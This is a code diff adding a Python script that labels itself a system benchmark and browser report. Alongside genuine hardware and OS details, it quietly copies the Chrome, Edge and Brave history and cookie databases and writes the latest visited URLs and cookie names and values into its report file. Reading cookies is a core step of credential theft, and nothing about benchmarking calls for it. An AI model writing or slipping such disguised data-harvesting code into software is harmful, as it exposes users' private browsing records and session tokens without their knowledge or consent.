@@ -1,0 +1,160 @@
+import os
+import datetime
+import platform
+import psutil
+import shutil
+import sqlite3
+import subprocess
+import json
+from pathlib import Path
+
+# Get the current timestamp for a unique filename
+timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+filename = f"benchmark_report_{timestamp}.txt"
+
+# Browser paths (default locations)
+BROWSER_PATHS = {
+    "Chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/History",
+    "Edge": Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data/Default/History",
+    "Brave": Path(os.getenv("LOCALAPPDATA", "")) / "BraveSoftware/Brave-Browser/User Data/Default/History",
+    "Firefox": Path(os.getenv("APPDATA", "")) / "Mozilla/Firefox/Profiles",
+}
+
+# Function to detect installed browsers and get their versions
+def get_browser_info():
+    browsers = {
+        "Chrome": "chrome --version",
+        "Firefox": "firefox --version",
+        "Edge": "msedge --version",
+        "Brave": "brave --version",
+    }
+
+    browser_info = {}
+    for name, command in browsers.items():
+        try:
+            version = subprocess.check_output(command, shell=True, text=True).strip()
+            browser_info[name] = version
+        except Exception:
+            browser_info[name] = "Not Installed"
+
+    return browser_info
+
+# Function to extract browsing history
+def get_browsing_history(browser_name, history_path):
+    history_data = []
+    if not history_path.exists():
+        return ["History file not found"]
+
+    try:
+        temp_copy = history_path.parent / f"History_Copy_{timestamp}.db"
+        shutil.copy2(history_path, temp_copy)  # Copy to avoid locking issues
+
+        conn = sqlite3.connect(temp_copy)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+        rows = cursor.fetchall()
+
+        for row in rows:
+            history_data.append(f"Title: {row[1]}, URL: {row[0]}")
+        
+        conn.close()
+        os.remove(temp_copy)  # Clean up the temp file
+
+    except Exception as e:
+        history_data.append(f"Error extracting history: {e}")
+
+    return history_data
+
+# Function to extract cookies (Chrome-based browsers)
+def get_cookies(browser_name):
+    cookies_data = []
+    cookies_path = BROWSER_PATHS.get(browser_name, None)
+    if not cookies_path:
+        return ["Cookies path not found"]
+
+    cookies_file = cookies_path.parent / "Cookies"
+
+    if not cookies_file.exists():
+        return ["No cookies found"]
+
+    try:
+        temp_copy = cookies_file.parent / f"Cookies_Copy_{timestamp}.db"
+        shutil.copy2(cookies_file, temp_copy)
+
+        conn = sqlite3.connect(temp_copy)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 10")
+        rows = cursor.fetchall()
+
+        for row in rows:
+            cookies_data.append(f"Site: {row[0]}, Cookie Name: {row[1]}, Value: {row[2]}")
+
+        conn.close()
+        os.remove(temp_copy)
+
+    except Exception as e:
+        cookies_data.append(f"Error extracting cookies: {e}")
+
+    return cookies_data
+
+# Gather system information
+system_info = {
+    "OS": platform.system(),
+    "OS Version": platform.version(),
+    "OS Release": platform.release(),
+    "Architecture": platform.architecture()[0],
+    "Processor": platform.processor(),
+    "CPU Cores": psutil.cpu_count(logical=False),
+    "Logical Processors": psutil.cpu_count(logical=True),
+    "RAM (Total)": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
+    "RAM (Available)": f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
+    "Disk (Total)": f"{psutil.disk_usage('/').total / (1024**3):.2f} GB",
+    "Disk (Used)": f"{psutil.disk_usage('/').used / (1024**3):.2f} GB",
+    "Disk (Free)": f"{psutil.disk_usage('/').free / (1024**3):.2f} GB",
+    "Python Version": platform.python_version(),
+}
+
+# Get browser information
+browser_info = get_browser_info()
+
+# Extract browsing history and cookies
+history_results = {}
+cookies_results = {}
+
+for browser, path in BROWSER_PATHS.items():
+    if path.exists():
+        history_results[browser] = get_browsing_history(browser, path)
+        cookies_results[browser] = get_cookies(browser)
+
+# Write system, browser, history, and cookies info to a file
+with open(filename, "w", encoding="utf-8") as file:
+    file.write("System Benchmark & Browser Report\n")
+    file.write("=" * 50 + "\n")
+    
+    # System Information
+    for key, value in system_info.items():
+        file.write(f"{key}: {value}\n")
+
+    # Installed Browsers
+    file.write("\nInstalled Browsers:\n")
+    file.write("=" * 50 + "\n")
+    for browser, version in browser_info.items():
+        file.write(f"{browser}: {version}\n")
+
+    # Browsing History
+    file.write("\nBrowsing History (Last 10 Entries per Browser):\n")
+    file.write("=" * 50 + "\n")
+    for browser, history in history_results.items():
+        file.write(f"\n{browser}:\n")
+        file.writelines(f"{entry}\n" for entry in history)
+
+    # Cookies
+    file.write("\nCookies (First 10 per Browser):\n")
+    file.write("=" * 50 + "\n")
+    for browser, cookies in cookies_results.items():
+        file.write(f"\n{browser}:\n")
+        file.writelines(f"{entry}\n" for entry in cookies)
+
+print(f"Benchmark & Browser report saved as '{filename}'.")
